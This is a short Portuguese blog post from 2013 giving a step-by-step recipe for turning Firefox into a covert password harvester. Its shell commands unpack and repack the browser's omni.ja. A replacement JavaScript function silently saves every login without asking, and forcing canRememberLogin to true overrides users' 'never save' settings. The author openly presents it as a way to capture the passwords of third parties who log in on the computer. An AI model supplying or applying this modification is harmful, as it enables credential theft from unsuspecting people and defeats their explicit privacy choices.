---
title: tornando o firefox um capturador de senhas
date: 2013-08-20T10:30:36+00:00
author: paolo
layout: post
permalink: /2013/08/20/tornando-o-firefox-um-capturador-de-senhas/
categories:
  - pt-BR
tags:
  - comp
  - hacks
---
É uma modificação na estrutura interna do firefox onde a informacao da construção da tela de pedido de confirmação no salvamento da senha é substituido pelo salvamento imediato. Muito simples e eficaz.  
primeiro é preciso descompactar o conteudo do omni.ja:

<pre class="brush: bash; title: ; notranslate" title="">unzip /usr/lib/firefox/omni.ja -d omni
</pre>

dentro do diretório gerado tem um arquivo components/nsLoginManagerPrompter.js que deve ser modificado mundando toda a função **_showSaveLoginNotification** ( procure com ctrl+f ) pelo conteudo a seguir

<pre class="brush: jscript; title: ; notranslate" title="">_showSaveLoginNotification : function (aNotifyObj, aLogin) {
var pwmgr = this._pwmgr;
pwmgr.addLogin(aLogin);
}
</pre>

uma outra modificação possivel/desejavel é mudar todos os canRememberLogin (crtl+f) para true; Desta forma, mesm oque voce tenha selecionado para não salvar senhas para um determinado site, o firefox vai bypassar a configuração.

apagar o cache para que a modificação seja &#8216;compilada&#8217; novamente:

<pre class="brush: bash; title: ; notranslate" title="">rm jsloader/resource/gre/components/nsLoginManagerPrompter.js
</pre>

depois, so repacotar e reenviar o conteudo do omni.ja para seu local de direito&#8230;

<pre class="brush: bash; title: ; notranslate" title="">cd omni
zip -qr9XD omni.ja *
sudo mv /usr/lib/firefox/omni.ja /usr/lib/firefox/omni.ja.old
sudo mv omni.ja /usr/lib/firefox/
</pre>

&#8230; e voilá, seu firefox é agora um pegador de senhas de terceiros&#8230; pode deixar todos logarem de seu computador e deslogar, pois a senha ja vai ficar salva ;D

**Ah, um detalhe especial: toda vez que for feito um update, essa modificação tem de ser refeita.**